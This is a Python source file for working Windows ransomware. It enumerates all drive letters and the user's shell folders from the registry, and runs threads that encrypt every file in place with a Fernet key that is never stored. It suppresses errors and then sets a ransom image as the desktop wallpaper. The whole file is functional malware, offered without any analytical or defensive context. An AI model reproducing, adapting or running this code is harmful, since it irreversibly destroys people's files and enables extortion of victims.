import os, string, ctypes, base64, winreg, ctypes
from cryptography.fernet import Fernet
from threading import Thread

image = '' #base64 image for desktop background

if __name__ == '__main__':
    try:
        windows_folder = os.environ['WINDIR']
        windows_folder = os.path.join(windows_folder, 'System32')
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

        encryption_key = Fernet.generate_key()
        cipher_suite = Fernet(encryption_key)

        decoded_image = base64.b64decode(image)

        available_drives = []
        for drive_letter in string.ascii_uppercase:
            drive_path = f"{drive_letter}:\\"
            if os.path.exists(drive_path):
                available_drives.append(drive_path)

        def encrypt_files(directory):
            for root, dirs, files in os.walk(directory):
                if 'Windows' in root:
                    continue
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            plaintext = f.read()

                        encrypted_data = cipher_suite.encrypt(plaintext)
                        
                        with open(file_path, 'wb') as f:
                            f.write(encrypted_data)

                    except Exception as e:
                        continue
                    
        def create_ransom_message(target_directory):
            jpeg_path = os.path.join(os.getcwd(), 'desktop.jpeg')

            with open(jpeg_path, "wb") as file:
                file.write(decoded_image)

            SPI_SETDESKWALLPAPER = 0x0014
            SPIF_UPDATEINIFILE = 0x01
            SPIF_SENDCHANGE = 0x02

            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, jpeg_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
            os.remove(jpeg_path)

        def run_ransomware(directory):
            encrypt_files(directory)

        def threads():
            threads = []
            values = get_registry_values(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")

            for name, data in values.items():
                if os.path.isdir(data):
                    t = Thread(target=run_ransomware, args=(data, ))
                    t.start()
                    threads.append(t)
            
            for drive in available_drives:
                t = Thread(target=run_ransomware, args=(drive, ))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()

        def get_registry_values(key_path):
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
                values = {}
                index = 0

                while True:
                    try:
                        value_name, value_data, value_type = winreg.EnumValue(key, index)
                        values[value_name] = value_data
                        index += 1
                    except OSError:
                        break

                winreg.CloseKey(key)
                return values

            except FileNotFoundError:
                return {}
            
        threads()
        create_ransom_message(desktop_path)
        
    except Exception as e:
        pass
